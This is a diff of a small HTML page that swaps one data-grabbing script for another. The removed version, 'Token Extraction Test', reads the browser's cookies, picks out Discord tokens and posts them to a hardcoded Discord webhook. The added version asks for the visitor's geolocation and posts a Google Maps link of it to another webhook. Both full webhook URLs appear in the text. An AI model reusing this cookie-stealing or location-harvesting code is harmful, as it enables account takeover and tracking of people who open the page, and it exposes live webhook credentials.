@@ -3,62 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Extraction Test</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-        }
-        h1 {
-            margin-top: 50px;
-        }
-        #output {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #fff;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            display: inline-block;
-        }
-    </style>
+    <title>Google Maps Location Sender</title>
 </head>
 <body>
-    <h1>Token Extraction Test</h1>
-    <button id="extractTokenButton">Extract and Send Token</button>
-    <p id="output"></p>
+    <h1>Send Your Location to Discord</h1>
+    <button id="sendLocation">Send Location</button>
 
     <script>
-        document.getElementById('extractTokenButton').addEventListener('click', function() {
-            // ดึง cookies จากเบราว์เซอร์
-            const cookies = document.cookie.split('; ');
-            const tokenData = {};
+        document.getElementById('sendLocation').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        });
 
-            cookies.forEach(cookie => {
-                const [name, value] = cookie.split('=');
-                // เงื่อนไขเพื่อค้นหา token Discord
-                if (name.includes('discord') || value.includes('token')) {
-                    tokenData[name] = value;
-                }
-            });
+        function sendPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const webhookUrl = "https://discord.com/api/webhooks/1272943176063123621/6MwZvPOZPoKX_iupyJJ-E19Kb9gZVeYfUH0IeLL-PrYUNOeXlq4j1aJSLyKcce4kdT1C";
+            
+            const data = {
+                content: `Current location: https://www.google.com/maps?q=${latitude},${longitude}`
+            };
 
-            // แสดงผลลัพธ์ในหน้า HTML
-            document.getElementById('output').textContent = `Cookies: ${JSON.stringify(tokenData, null, 2)}`;
-
-            // ส่งข้อมูลไปยัง Webhook URL
-            fetch('https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd', {
+            fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ cookies: tokenData })
-            })
-            .then(response => response.text())
-            .then(data => console.log('Success:', data))
-            .catch(error => console.error('Error:', error));
-        });
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    alert("Location sent successfully!");
+                } else {
+                    alert("Failed to send location.");
+                }
+            }).catch(error => {
+                alert("Error: " + error);
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
     </script>
 </body>
 </html>
